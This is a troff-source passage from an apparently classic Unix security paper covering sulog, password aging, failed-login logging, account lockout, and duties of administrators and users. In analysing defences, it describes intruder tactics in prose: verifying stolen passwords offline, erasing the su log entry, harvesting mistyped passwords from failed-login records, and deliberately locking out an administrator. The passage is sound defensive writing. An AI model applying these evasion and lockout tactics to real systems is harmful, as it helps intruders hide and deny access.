can get a very short list of names in which a stranger will likely
stand out like a sore thumb.
.PP
Now consider the plight of an intruder who has just used a borrowed
password to break into a strange machine, and who now has the task
of locating the important people from among perhaps hundreds in the
password file. Fortunately, the important people can readily be
identified by their ability to become super-user. Thus the same
technique applied to the same file produces the same list \(em but
now it is a list of horse targets.
.PP
This implies that
.CW sulog 
had better be unreadable as well as unwritable.
Such files are difficult to handle for a variety of reasons.
Copies and summaries with relaxed permissions are likely to be
owned by the important people.
.PP
.CW sulog
thus appears to help both the defenders and the attackers.
This would indeed be the case if there were ever a need for an
intruder to make an entry in the file. There is no such need.
Only the most inexperienced intruder will use the
.I su 
command to
try out a guess or a pilfered password. The indirect approach
of encrypting the guess and comparing it with the password file
entry will provide verification without leaving any tracks.
Once sure of a password, the intruder can then use
.I su ,
and just
remove the last telltale line from
.CW sulog .
.PP
If
.CW sulog
exists on a machine, no matter how it is protected
or what it is called, there is a potential risk for the administrator
but none for the knowledgeable intruder. The way to reverse the 
score is to keep the tracks off the machine, where they cannot
be accessed, even by the super-user. The paper console copy in
the machine room is a very good place, especially if the system
administrator reads it occasionally.
.NH 2
Password aging
.PP
One of the many problems with passwords is that most people,
left unreminded, will keep a password forever. The longer a password 
is used, the greater the chance that it will become compromised.
Also, stolen passwords are useful to their thief for as long
as they remain valid.
.PP
Most
.UX
systems are provided with a feature called
.I "password aging" , 
which, if activated by the system administrator, will
cause users of the system to change their passwords every so often.
.PP
The goal is laudable. The algorithm, however, is bad, and the
implementation, from a security standpoint, is just awful.
.PP
In systems on which the feature is used, the system administrator
assigns, on a user-by-user basis, the length of time that a
password can remain valid. The first time that a user whose password
has rotted attempts to log into the system, the message: ``Your
password has expired. Choose a new one.'' is printed and the user
is made to execute the
.I passwd
command rather than the shell. The
passwd command prompts for a new password, installs it, and records
the time of installation. Further, to prevent a user from changing
a password from X to Y and then promptly back to X,
.I passwd 
will
refuse to change a password that is less than a week old.
.PP
Four things are wrong here. First, picking good passwords, while
not very difficult, does require a little thought, and the surprise
that comes just at login time is likely to preclude this. There
is no hard evidence to support this conjecture, but it is a fact
that the most incredibly silly passwords tend to be found on
systems equipped with password aging.
.PP
Second, the user who discovers
that the new password is unsound or compromised cannot change it
within the week without help from the system administrator.
.PP
Third,
the feature only forces people to toggle back and forth between two
passwords. This is not a great gain in security, especially if it
encourages the use of less-than-ideal passwords.
.PP
Fourth, as implemented, the date and the lifetime of a password is encoded, not encrypted,
just after the encrypted password in the password file. It is easy
to write a program that scans a password file and prints out a list
of abandoned accounts, together with the length of time each account
has been unused. Whether this is a horror or a blessing depends on
one's point of view.
.PP
The aging of passwords is a difficult problem, yet unsolved.
.NH 2
Recording unsuccessful login attempts
.PP
Some systems record unsuccessful login attempts.
The login name, time and terminal number are stored.
The password used is not, for the obvious reasons. The intent of
such logging is to alert the system administrator to the presence
of an intruder who stands at the door making guesses at the key.
.PP
One reason that login attempts fail is that people sometimes type
a password when asked for a login name. Whether this is due to haste,
carelessness, inattention, or sluggish system response during peak
hours is not known. What is known is that collecting login names
from unsuccessful access attempts will almost invariably collect
a few passwords as well and that any `login name' thus collected
that is not found in the system's password file is almost certainly
a password. Finding the match is not difficult.
.NH 2
Disabling accounts based on unsuccessful logins
.PP
Some systems will count the number of consecutive unsuccessful
login attempts for a particular user and disable the account
after some pain threshold is reached. The magic number is
usually three. This ploy has the marginal benefit of annoying
would-be intruders who go through the unprofitable exercise
of casting spells at the door, hoping it will open. For the
intruder who has already gained access to the system, and
who wants to get rid of the system administrator,
the feature is a blessing:
.P1
login: guru
password: foo
.P2
repeated the appropriate number of times will assure the 
intruder of privacy for at least a little while.
.NH 
People
.PP
By far the greatest security hazard for a system,
.UX
or otherwise,
is the set of people who use it. If the people who use a 
machine are naive about security issues, the machine will
be vulnerable regardless of what is done by the local
management. This applies particularly to the system's 
administrators, but ordinary users should also take heed.
.NH 2
Administrators' Concerns
.PP
The system administrator is responsible for overseeing the
security of the system as a whole. Several things are
especially important.
.DL
The password file is the most important file to watch
in the system. It should not, of course, be writable
by anyone other than the super-user, nor should it be
available for perusal by anyone who is not currently
logged into the machine. For example, it should not
be shipped by
.I uucp 
in response to an outside request.
.DL
Login entries with no passwords are very unwise.
.DL
Group logins, that is, the use of a single login name
and password for a number of people, are to be avoided.
The owner of a machine is entitled to know who is
using it, and group logins thwart this. Further, the
idea of a group login does little to instill in its
users the notion that they are individually responsible
for their conduct on a machine.
.DL
The worst group login, and one that is found on
virtually all
.UX
machines, is
.CW root , 
the login name
of the super-user. Every time that someone logs in
as
.CW root , 
the system administrator can tell that
someone logged in with super-user privileges, but there
is no hint as to who that person might be. Many systems
make it impossible to login as
.CW root 
via dialup lines;
some restrict the login to the system console. In fact,
there is no need for anonymous super-users. It is better to
require a normal login and effect the transformation
via the
.I su 
command, especially if
.I su 
leaves tracks on
a piece of paper somewhere.
.DL
The use of restricted shells to contain people who
log in without passwords or through group logins
is simply ineffective.
.DL
Administrators' personal passwords are most important,
both to the administrators and to potential intruders.
An intruder is happy to get anybody's password that
provides access to the machine. If the password is
that of a system administrator and thus allows
some special group permissions such as
.CW bin ,
.CW sys
or
.CW uucp , 
so much the better. It is strongly recommended that
administrators use different passwords on the machines
that they maintain than they use on any other machines.
.DL
A system administrator should be able to explain the
presence of every SUID-root program on the system, and
to show that these have at least been looked at for
surprises. Compilation from `clean' source code is
helpful, but not always sufficient.
.DL
Protection against horses for people who have
super-user privileges is essential. This means checking
PATH variables, directories and files owned by such
people to see that the files that they execute
are writable only by themselves or by trusted
administrators. Again, such protection is not
sufficient, but it does remove the obvious targets.
.DL
Finally, the system administrator should work to 
develop an awareness of security issues in the 
user community as a whole.
.NH 2
Users' Concerns
.PP
Users, including system administrators, often have surprisingly
bad habits with respect to system security. Here are some of
the worst.
.DL
Giving away logins and passwords is all too common.
The same people who would never consider giving the
keys to a company car to a friend are often quite
willing to give away the keys to the company computer,
even though the potential for loss may be orders of 
magnitude greater.
.DL
Obvious swindles tend to be ignored. Most Trojan horses work
only because most people have not given any thought
to the fact that programs that ask for things
like passwords might not be the genuine article.
If something goes wrong, they ask no questions.
.DL
Generally, little thought goes into the choice of
non-trivial passwords, passwords are not changed
except under duress, and a `one size fits all'
attitude is common.
.DL
Carefree networking is the norm, not the exception.
.DL
Sensitive information about projects and people is
routinely kept on public machines.
.PP
The only approach to these problems is user education.
.NH
Conclusion
.PP
At the beginning of this paper it was noted that
.UX
systems, when used for the purposes and in the environment
for which they were designed, cannot be made secure. The
supporting arguments for that statement should now be clear.
Several other things should also be clear:
.DL
The security of any given
.UX
system can vary from
very weak to very strong, depending on a large number
of factors and their interactions. The most important
of these are the habits and attitudes of administrators
and users.
.DL
Software changes can be made that will greatly increase
the security of a system. However, since the same tools
can be just as potent for an intruder as for an administrator,
they must be carefully designed, lest they backfire.
.DL
The question of convenience vs. security, which depends
on the nature of a given application, must be carefully
considered before implementing and installing that
application. In particular, there are some things that
should not be put on any `public' machine.
.PP
It was also noted that the security hazards of
.UX
systems
are exactly those of other systems that are used for
similar purposes in similar environments. Only the forms
of the hazards are different. If, from the examples given,
it seems easier to subvert
.UX
systems than most other
systems, the impression is a false one. The subversion
techniques are the same. It is just that it is often
easier to write, install, and use programs
on
.UX
systems than on most
other systems, and that is why the
.UX
system was designed
in the first place.
.NH
References
.LP
|reference_placement
